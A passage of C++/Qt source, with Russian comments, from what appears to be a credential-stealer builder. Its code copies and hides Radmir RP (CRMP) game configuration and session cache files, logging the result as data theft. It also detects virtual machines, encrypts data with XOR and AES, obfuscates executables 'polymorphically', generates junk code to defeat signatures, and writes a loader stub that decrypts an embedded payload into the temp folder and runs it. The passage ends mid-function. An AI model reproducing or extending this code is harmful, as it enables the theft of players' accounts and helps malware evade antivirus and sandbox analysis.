                line.find("server") != std::string::npos || 
                line.find("session") != std::string::npos) {
                result += "Radmir RP (CRMP): " + line + "\n";
            }
        }
        configFile.close();

        // Сохраняем содержимое
        std::ofstream outFile(radmirDestPath);
        if (outFile.is_open()) {
            outFile << configContent;
            outFile.close();
            emitLog("Конфигурация Radmir RP (CRMP) сохранена и скрыта: " + QString::fromStdString(radmirDestPath));
        } else {
            emitLog("Ошибка: Не удалось сохранить конфигурацию Radmir RP");
        }
    } else {
        emitLog("Файл settings.ini для Radmir RP (CRMP) не найден");
    }

    // Проверка кэша Radmir CRMP (например, USERDATA или logs)
    std::string radmirCachePath = appData + "\\RadmirCRMP\\USERDATA";
    if (std::filesystem::exists(radmirCachePath)) {
        for (const auto& entry : std::filesystem::directory_iterator(radmirCachePath)) {
            std::string fileName = entry.path().filename().string();
            // Ищем файлы, связанные с Radmir RP
            if (fileName.find("radmir") != std::string::npos || fileName.find(".dat") != std::string::npos) {
                std::string destFilePath = radmirDir + "\\" + fileName;
                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                SetFileAttributesA(destFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
                collectedFiles.push_back(destFilePath);
                result += "Radmir RP (CRMP) Cache: " + fileName + "\n";
                emitLog("Кэш Radmir RP (CRMP) скопирован и скрыт: " + QString::fromStdString(destFilePath));
            }
        }
    }

    if (result.empty()) {
        emitLog("Данные Radmir RP (CRMP) не найдены");
        std::filesystem::remove_all(radmirDir);
        return "";
    }

    emitLog("Кража данных Radmir RP (CRMP) завершена");
    return result;
}

// Реализация animateSection
void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer) {
    if (!sectionLabel) return;

    QWidget* parentWidget = sectionLabel->parentWidget();
    QVBoxLayout* layout = qobject_cast<QVBoxLayout*>(parentWidget ? parentWidget->layout() : nullptr);
    if (!layout) return;

    QList<QWidget*> widgetsToAnimate;
    int startIndex = layout->indexOf(sectionLabel);
    int endIndex = spacer ? layout->indexOf(spacer) : layout->count();

    widgetsToAnimate.append(sectionLabel);
    for (int i = startIndex + 1; i < endIndex; ++i) {
        QLayoutItem* item = layout->itemAt(i);
        if (QWidget* widget = item->widget()) {
            if (dynamic_cast<QCheckBox*>(widget) || dynamic_cast<QComboBox*>(widget)) {
                widgetsToAnimate.append(widget);
            }
        }
    }

    for (QWidget* widget : widgetsToAnimate) {
        widget->setStyleSheet("opacity: 0;");
        widget->setMaximumHeight(0);
    }

    QParallelAnimationGroup* group = new QParallelAnimationGroup(this);
    for (QWidget* widget : widgetsToAnimate) {
        QPropertyAnimation* opacityAnimation = new QPropertyAnimation(widget, "windowOpacity");
        opacityAnimation->setDuration(500);
        opacityAnimation->setStartValue(0);
        opacityAnimation->setEndValue(1);
        opacityAnimation->setEasingCurve(QEasingCurve::OutCubic);

        QPropertyAnimation* heightAnimation = new QPropertyAnimation(widget, "maximumHeight");
        heightAnimation->setDuration(500);
        heightAnimation->setStartValue(0);
        heightAnimation->setEndValue(widget->sizeHint().height());
        heightAnimation->setEasingCurve(QEasingCurve::OutCubic);

        group->addAnimation(opacityAnimation);
        group->addAnimation(heightAnimation);
    }

    QTimer::singleShot(widgetsToAnimate.indexOf(sectionLabel) * 200, this, [group]() {
        group->start(QAbstractAnimation::DeleteWhenStopped);
    });
}

// Реализация generateRandomString
std::string MainWindow::generateRandomString(size_t length) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::string result;
    result.reserve(length);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

    for (size_t i = 0; i < length; ++i) {
        result += alphanum[dis(gen)];
    }

    return result;
}

// Реализация generateUniqueXorKey
std::string MainWindow::generateUniqueXorKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream ss;
    for (int i = 0; i < 16; ++i) {
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }
    return ss.str();
}

// Реализация GetEncryptionKey
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string keyStr = useFirstKey ? encryptionKey1 : encryptionKey2;
    if (keyStr.empty()) {
        keyStr = generateRandomString(16);
        if (useFirstKey) encryptionKey1 = keyStr;
        else encryptionKey2 = keyStr;
    }
    std::array<unsigned char, 16> key;
    if (keyStr.length() >= 16) {
        std::copy_n(keyStr.begin(), 16, key.begin());
    } else {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);
        }
    }
    return key;
}

// Реализация generateIV
std::array<unsigned char, 16> MainWindow::generateIV() {
    std::array<unsigned char, 16> iv;
    if (RAND_bytes(iv.data(), iv.size()) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать IV для AES");
        std::fill(iv.begin(), iv.end(), 0);
    }
    return iv;
}

// Реализация isRunningInVM
bool MainWindow::isRunningInVM() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[1024];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", nullptr, nullptr, reinterpret_cast<LPBYTE>(buffer), &size) == ERROR_SUCCESS) {
            std::string biosVersion(buffer);
            if (biosVersion.find("VMware") != std::string::npos || biosVersion.find("VirtualBox") != std::string::npos) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
    return false;
}

// Реализация applyXOR
QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key) {
    QByteArray result = data;
    for (int i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

// Реализация applyAES
QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
    QByteArray result;
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES: " + QString::number(status, 16));
        return QByteArray();
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_CBC)), sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось установить режим цепочки: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, const_cast<PUCHAR>(key.data()), static_cast<ULONG>(key.size()), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось сгенерировать ключ AES: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    DWORD bytesEncrypted = 0;
    DWORD resultSize = static_cast<DWORD>(data.size() + 16); // Дополнительное место под padding
    std::vector<UCHAR> encryptedData(resultSize);

    status = BCryptEncrypt(hKey, reinterpret_cast<PUCHAR>(const_cast<char*>(data.data())), static_cast<ULONG>(data.size()), nullptr,
                           const_cast<PUCHAR>(iv.data()), static_cast<ULONG>(iv.size()), encryptedData.data(), resultSize, &bytesEncrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка шифрования AES: " + QString::number(status, 16));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    result = QByteArray(reinterpret_cast<char*>(encryptedData.data()), static_cast<int>(bytesEncrypted));

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return result;
}

// Реализация decryptData
std::string MainWindow::decryptData(const std::string& encryptedData) {
    if (encryptedData.size() < 16) {
        emitLog("Ошибка: Данные слишком малы для дешифрования (нет IV)");
        return "";
    }

    std::array<unsigned char, 16> iv;
    std::memcpy(iv.data(), encryptedData.data(), 16);

    QByteArray encryptedByteData(encryptedData.data() + 16, encryptedData.size() - 16);
    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES для дешифрования: " + QString::number(status, 16));
        return "";
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_CBC)), sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось установить режим цепочки для дешифрования: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, const_cast<PUCHAR>(key2.data()), static_cast<ULONG>(key2.size()), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось сгенерировать ключ AES для дешифрования: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    DWORD bytesDecrypted = 0;
    DWORD resultSize = static_cast<DWORD>(encryptedByteData.size());
    std::vector<UCHAR> decryptedData(resultSize);

    status = BCryptDecrypt(hKey, reinterpret_cast<PUCHAR>(const_cast<char*>(encryptedByteData.data())), static_cast<ULONG>(encryptedByteData.size()), nullptr,
                           const_cast<PUCHAR>(iv.data()), static_cast<ULONG>(iv.size()), decryptedData.data(), resultSize, &bytesDecrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка дешифрования AES: " + QString::number(status, 16));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    QByteArray xorData(reinterpret_cast<char*>(decryptedData.data()), static_cast<int>(bytesDecrypted));
    QByteArray decryptedByteData = applyXOR(xorData, key1);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string(decryptedByteData.constData(), decryptedByteData.size());
}

// Реализация generateEncryptionKeys
void MainWindow::generateEncryptionKeys() {
    emitLog("Генерация ключей шифрования...");

    const int keyLength = 32;
    const int saltLength = 16;
    std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, static_cast<int>(chars.size()) - 1);

    encryptionKey1.clear();
    for (int i = 0; i < keyLength; ++i) {
        encryptionKey1 += chars[dis(gen)];
    }

    encryptionKey2.clear();
    for (int i = 0; i < keyLength; ++i) {
        encryptionKey2 += chars[dis(gen)];
    }

    encryptionSalt.clear();
    for (int i = 0; i < saltLength; ++i) {
        encryptionSalt += chars[dis(gen)];
    }

    emitLog("Ключи шифрования сгенерированы: key1=" + QString::fromStdString(encryptionKey1) +
            ", key2=" + QString::fromStdString(encryptionKey2) +
            ", salt=" + QString::fromStdString(encryptionSalt));
}

// Реализация obfuscateExecutable
void MainWindow::obfuscateExecutable(const std::string& exePath) {
    emitLog("Обфускация исполняемого файла: " + QString::fromStdString(exePath));

    std::ifstream inFile(exePath, std::ios::binary);
    if (!inFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть исполняемый файл для обфускации");
        return;
    }

    std::vector<char> exeData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    std::array<unsigned char, 16> obfKey;
    if (RAND_bytes(obfKey.data(), obfKey.size()) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать ключ для обфускации");
        return;
    }

    for (size_t i = 0; i < exeData.size(); ++i) {
        exeData[i] ^= obfKey[i % obfKey.size()];
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1024, 4096);
    int junkSize = dis(gen);
    std::vector<char> junkData(junkSize);
    if (RAND_bytes(reinterpret_cast<unsigned char*>(junkData.data()), junkSize) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать мусорные данные для обфускации");
        return;
    }

    std::string obfPath = exePath + ".obf";
    std::ofstream outFile(obfPath, std::ios::binary);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать обфусцированный файл");
        return;
    }

    outFile.write(exeData.data(), exeData.size());
    outFile.write(junkData.data(), junkSize);
    outFile.close();

    try {
        std::filesystem::rename(obfPath, exePath);
        emitLog("Исполняемый файл успешно обфусцирован: " + QString::fromStdString(exePath));
    } catch (const std::exception& e) {
        emitLog("Ошибка переименования обфусцированного файла: " + QString::fromStdString(e.what()));
    }
}

// Реализация applyPolymorphicObfuscation
void MainWindow::applyPolymorphicObfuscation(const std::string& exePath) {
    emitLog("Применение полиморфной обфускации к исполняемому файлу: " + QString::fromStdString(exePath));

    std::ifstream inFile(exePath, std::ios::binary);
    if (!inFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть исполняемый файл для полиморфной обфускации");
        return;
    }

    std::vector<char> exeData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    unsigned char key[32];
    if (RAND_bytes(key, sizeof(key)) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать ключ для полиморфной обфускации");
        return;
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        emitLog("Ошибка: Не удалось создать контекст шифрования для полиморфной обфускации");
        return;
    }

    unsigned char iv[16];
    if (RAND_bytes(iv, sizeof(iv)) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать IV для полиморфной обфускации");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv) != 1) {
        emitLog("Ошибка: Не удалось инициализировать шифрование для полиморфной обфускации");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    std::vector<unsigned char> encryptedData(exeData.size() + EVP_MAX_BLOCK_LENGTH);
    int outLen = 0;
    int totalLen = 0;

    if (EVP_EncryptUpdate(ctx, encryptedData.data(), &outLen, reinterpret_cast<unsigned char*>(exeData.data()), static_cast<int>(exeData.size())) != 1) {
        emitLog("Ошибка: Не удалось выполнить шифрование для полиморфной обфускации");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    totalLen += outLen;

    if (EVP_EncryptFinal_ex(ctx, encryptedData.data() + outLen, &outLen) != 1) {
        emitLog("Ошибка: Не удалось завершить шифрование для полиморфной обфускации");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    totalLen += outLen;

    EVP_CIPHER_CTX_free(ctx);

    std::string polyPath = exePath + ".poly";
    std::ofstream outFile(polyPath, std::ios::binary);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для полиморфной обфускации");
        return;
    }

    outFile.write(reinterpret_cast<char*>(iv), sizeof(iv));
    outFile.write(reinterpret_cast<char*>(encryptedData.data()), totalLen);
    outFile.close();

    try {
        std::filesystem::rename(polyPath, exePath);
        emitLog("Полиморфная обфускация успешно применена: " + QString::fromStdString(exePath));
    } catch (const std::exception& e) {
        emitLog("Ошибка переименования файла после полиморфной обфускации: " + QString::fromStdString(e.what()));
    }
}

// Реализация generatePolymorphicCode
std::string MainWindow::generatePolymorphicCode() {
    emitLog("Генерация полиморфного кода...");

    std::ofstream polyFile("polymorphic_code.h");
    if (!polyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать polymorphic_code.h. Проверьте права доступа.");
        isBuilding = false;
        return "";
    }

    polyFile << "#ifndef POLYMORPHIC_CODE_H\n";
    polyFile << "#define POLYMORPHIC_CODE_H\n\n";
    polyFile << "#include <random>\n";
    polyFile << "#include <string>\n";
    polyFile << "#include <sstream>\n";
    polyFile << "#include <iomanip>\n";
    polyFile << "#include <chrono>\n";
    polyFile << "#include <thread>\n\n";
    polyFile << "// Этот файл перегенерируется динамически в mainwindow.cpp через generatePolymorphicCode()\n\n";

    polyFile << "inline int getRandomNumber(int min, int max) {\n";
    polyFile << "    static std::random_device rd;\n";
    polyFile << "    static std::mt19937 gen(rd());\n";
    polyFile << "    std::uniform_int_distribution<> dis(min, max);\n";
    polyFile << "    return dis(gen);\n";
    polyFile << "}\n\n";

    polyFile << "inline std::string generateRandomString(size_t length) {\n";
    polyFile << "    static const char alphanum[] =\n";
    polyFile << "        \"0123456789\"\n";
    polyFile << "        \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n";
    polyFile << "        \"abcdefghijklmnopqrstuvwxyz\";\n";
    polyFile << "    std::string result;\n";
    polyFile << "    result.reserve(length);\n";
    polyFile << "    for (size_t i = 0; i < length; ++i) {\n";
    polyFile << "        result += alphanum[getRandomNumber(0, sizeof(alphanum) - 2)];\n";
    polyFile << "    }\n";
    polyFile << "    return result;\n";
    polyFile << "}\n\n";

    polyFile << "inline std::string generateRandomFuncName() {\n";
    polyFile << "    static const char* prefixes[] = {\"polyFunc\", \"obfFunc\", \"cryptFunc\", \"hideFunc\", \"maskFunc\"};\n";
    polyFile << "    std::stringstream ss;\n";
    polyFile << "    ss << prefixes[getRandomNumber(0, 4)] << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999) << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999);\n";
    polyFile << "    return ss.str();\n";
    polyFile << "}\n\n";

    polyFile << "namespace Polymorphic {\n\n";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(5, 10);
    int funcCount = dis(gen);
    std::vector<std::string> funcNames;
    for (int i = 0; i < funcCount; ++i) {
        std::string funcName;
        do {
            std::stringstream ss;
            ss << "polyFunc_" << std::setw(5) << std::setfill('0') << dis(gen) << "_" << std::setw(5) << std::setfill('0') << dis(gen);
            funcName = ss.str();
        } while (std::find(funcNames.begin(), funcNames.end(), funcName) != funcNames.end());
        funcNames.push_back(funcName);
        polyFile << "    inline void " << funcName << "() {\n";
        polyFile << "        volatile int dummy_" << dis(gen) << "_" << dis(gen) << " = getRandomNumber(1000, 15000);\n";
        polyFile << "        std::string noise = generateRandomString(getRandomNumber(5, 20));\n";
        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ static_cast<int>(noise.length());\n";
        polyFile << "        for (int i = 0; i < getRandomNumber(3, 15); i++) {\n";
        polyFile << "            if (dummy2_" << dis(gen) << "_" << dis(gen) << " % 2 == 0) {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " << getRandomNumber(1, 3)) ^ noise[i % noise.length()];\n";
        polyFile << "            } else {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " >> getRandomNumber(1, 2)) + getRandomNumber(10, 50);\n";
        polyFile << "            }\n";
        polyFile << "        }\n";
        polyFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 10)));\n";
        polyFile << "    }\n\n";
    }

    polyFile << "    inline void executePolymorphicCode() {\n";
    for (const auto& funcName : funcNames) {
        polyFile << "        " << funcName << "();\n";
    }
    polyFile << "    }\n\n";

    polyFile << "} // namespace Polymorphic\n\n";
    polyFile << "#endif // POLYMORPHIC_CODE_H\n";

    polyFile.close();
    emitLog("Полиморфный код сгенерирован в polymorphic_code.h");

    std::stringstream polyCode;
    polyCode << "#include \"polymorphic_code.h\"\n";
    polyCode << "void runPolymorphicCode() {\n";
    polyCode << "    Polymorphic::executePolymorphicCode();\n";
    polyCode << "}\n";
    return polyCode.str();
}

// Реализация generateBuildKeyHeader
void MainWindow::generateBuildKeyHeader(const std::string& encryptionKey) {
    emitLog("Генерация заголовочного файла ключей...");

    std::ofstream keyFile("build_key.h");
    if (!keyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать build_key.h. Проверьте права доступа.");
        isBuilding = false;
        return;
    }

    keyFile << "#ifndef BUILD_KEY_H\n";
    keyFile << "#define BUILD_KEY_H\n\n";
    keyFile << "#include <array>\n";
    keyFile << "#include <string>\n";
    keyFile << "#include <sstream>\n";
    keyFile << "#include <iomanip>\n";
    keyFile << "#include <random>\n";
    keyFile << "#include <cstring>\n\n";
    keyFile << "// Этот файл генерируется автоматически в mainwindow.cpp через generateBuildKeyHeader()\n\n";

    keyFile << "const std::string ENCRYPTION_KEY_1 = \"" << encryptionKey1 << "\";\n";
    keyFile << "const std::string ENCRYPTION_KEY_2 = \"" << encryptionKey2 << "\";\n";
    keyFile << "const std::string ENCRYPTION_SALT = \"" << encryptionSalt << "\";\n";
    keyFile << "const std::string BUILD_ENCRYPTION_KEY = \"" << encryptionKey << "\";\n\n";

    keyFile << "inline std::array<unsigned char, 16> GenerateUniqueKey() {\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "        key[i] = static_cast<unsigned char>(dis(gen));\n";
    keyFile << "    }\n";
    keyFile << "    return key;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateUniqueXorKey() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 16; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GetXorKey() {\n";
    keyFile << "    std::string key1 = ENCRYPTION_KEY_1;\n";
    keyFile << "    std::string key2 = ENCRYPTION_KEY_2;\n";
    keyFile << "    std::string salt = ENCRYPTION_SALT;\n";
    keyFile << "    std::string combined = key1 + key2 + salt;\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "        key[i] = static_cast<unsigned char>(combined[i % combined.length()]);\n";
    keyFile << "    }\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (auto byte : key) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "#endif // BUILD_KEY_H\n";

    keyFile.close();
    emitLog("Заголовочный файл ключей сгенерирован: build_key.h");
}

// Реализация generateJunkCode
std::string MainWindow::generateJunkCode() {
    emitLog("Генерация мусорного кода...");

    std::ofstream junkFile("junk_code.h");
    if (!junkFile.is_open()) {
        emitLog("Ошибка: Не удалось создать junk_code.h. Проверьте права доступа.");
        isBuilding = false;
        return "";
    }

    junkFile << "#ifndef JUNK_CODE_H\n";
    junkFile << "#define JUNK_CODE_H\n\n";
    junkFile << "#include <random>\n";
    junkFile << "#include <string>\n";
    junkFile << "#include <vector>\n";
    junkFile << "#include <chrono>\n";
    junkFile << "#include <thread>\n\n";
    junkFile << "// Этот файл генерируется автоматически в mainwindow.cpp через generateJunkCode()\n\n";

    junkFile << "inline int getRandomNumber(int min, int max) {\n";
    junkFile << "    static std::random_device rd;\n";
    junkFile << "    static std::mt19937 gen(rd());\n";
    junkFile << "    std::uniform_int_distribution<> dis(min, max);\n";
    junkFile << "    return dis(gen);\n";
    junkFile << "}\n\n";

    junkFile << "namespace JunkCode {\n\n";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(10, 20);
    int junkFuncCount = dis(gen);
    std::vector<std::string> junkFuncNames;
    for (int i = 0; i < junkFuncCount; ++i) {
        std::string funcName = "junkFunc_" + std::to_string(i) + "_" + std::to_string(dis(gen));
        junkFuncNames.push_back(funcName);
        junkFile << "    inline void " << funcName << "() {\n";
        junkFile << "        volatile int x = getRandomNumber(1000, 10000);\n";
        junkFile << "        volatile int y = getRandomNumber(500, 5000);\n";
        junkFile << "        std::vector<int> noise;\n";
        junkFile << "        for (int j = 0; j < getRandomNumber(5, 20); ++j) {\n";
        junkFile << "            noise.push_back(getRandomNumber(1, 100));\n";
        junkFile << "        }\n";
        junkFile << "        for (size_t k = 0; k < noise.size(); ++k) {\n";
        junkFile << "            if (noise[k] % 2 == 0) {\n";
        junkFile << "                x = (x ^ noise[k]) + y;\n";
        junkFile << "            } else {\n";
        junkFile << "                y = (y - noise[k]) ^ x;\n";
        junkFile << "            }\n";
        junkFile << "        }\n";
        junkFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 5)));\n";
        junkFile << "    }\n\n";
    }

    junkFile << "    inline void executeJunkCode() {\n";
    for (const auto& funcName : junkFuncNames) {
        junkFile << "        " << funcName << "();\n";
    }
    junkFile << "    }\n\n";

    junkFile << "} // namespace JunkCode\n\n";
    junkFile << "#endif // JUNK_CODE_H\n";

    junkFile.close();
    emitLog("Мусорный код сгенерирован в junk_code.h");

    std::stringstream junkCode;
    junkCode << "#include \"junk_code.h\"\n";
    junkCode << "void runJunkCode() {\n";
    junkCode << "    JunkCode::executeJunkCode();\n";
    junkCode << "}\n";
    return junkCode.str();
}

// Реализация generateRandomKey
std::string MainWindow::generateRandomKey(size_t length) {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::string key;
    key.reserve(length);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(charset) - 2);

    for (size_t i = 0; i < length; ++i) {
        key += charset[dis(gen)];
    }

    return key;
}

// Реализация generateStubCode
std::string MainWindow::generateStubCode(const std::string& key) {
    emitLog("Генерация кода загрузчика (stub)...");

    std::stringstream stub;
    stub << "#include <windows.h>\n";
    stub << "#include <string>\n";
    stub << "#include <vector>\n\n";
    stub << "const std::string ENCRYPTION_KEY = \"" << key << "\";\n\n";
    stub << "void decryptData(std::vector<char>& data, const std::string& key) {\n";
    stub << "    for (size_t i = 0; i < data.size(); ++i) {\n";
    stub << "        data[i] ^= key[i % key.length()];\n";
    stub << "    }\n";
    stub << "}\n\n";
    stub << "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n";
    stub << "    char exePath[MAX_PATH];\n";
    stub << "    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) return 1;\n";
    stub << "    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n";
    stub << "    if (hFile == INVALID_HANDLE_VALUE) return 1;\n";
    stub << "    DWORD fileSize = GetFileSize(hFile, NULL);\n";
    stub << "    if (fileSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return 1; }\n";
    stub << "    std::vector<char> fileData(fileSize);\n";
    stub << "    DWORD bytesRead;\n";
    stub << "    if (!ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) { CloseHandle(hFile); return 1; }\n";
    stub << "    CloseHandle(hFile);\n";
    stub << "    size_t stubSize = 4096;\n";
    stub << "    if (fileSize <= stubSize) return 1;\n";
    stub << "    std::vector<char> encryptedData(fileData.begin() + stubSize, fileData.end());\n";
    stub << "    decryptData(encryptedData, ENCRYPTION_KEY);\n";
    stub << "    char tempPath[MAX_PATH];\n";
    stub << "    if (!GetTempPathA(MAX_PATH, tempPath)) return 1;\n";
    stub << "    std::string tempFilePath = std::string(tempPath) + \"temp_build.exe\";\n";
    stub << "    HANDLE hTempFile = CreateFileA(tempFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n";
    stub << "    if (hTempFile == INVALID_HANDLE_VALUE) return 1;\n";
    stub << "    DWORD bytesWritten;\n";
    stub << "    if (!WriteFile(hTempFile, encryptedData.data(), encryptedData.size(), &bytesWritten, NULL) || bytesWritten != encryptedData.size()) { CloseHandle(hTempFile); return 1; }\n";
    stub << "    CloseHandle(hTempFile);\n";
    stub << "    STARTUPINFOA si = { sizeof(si) };\n";
    stub << "    PROCESS_INFORMATION pi;\n";
    stub << "    if (CreateProcessA(tempFilePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n";
    stub << "    WaitForSingleObject(pi.hProcess, INFINITE);\n";
    stub << "        CloseHandle(pi.hProcess);\n";
    stub << "        CloseHandle(pi.hThread);\n";
    stub << "    }\n";
    stub << "    DeleteFileA(tempFilePath.c_str());\n";
    stub << "    return 0;\n";
    stub << "}\n";

    std::ofstream stubFile("stub.cpp");
    if (!stubFile.is_open()) {
        emitLog("Ошибка: Не удалось создать stub.cpp");
        return "";
    }
    stubFile << stub.str();
    stubFile.close();

    std::string stubExePath = "stub.exe";
    std::string compileCommand = "g++ stub.cpp -o " + stubExePath + " -mwindows";
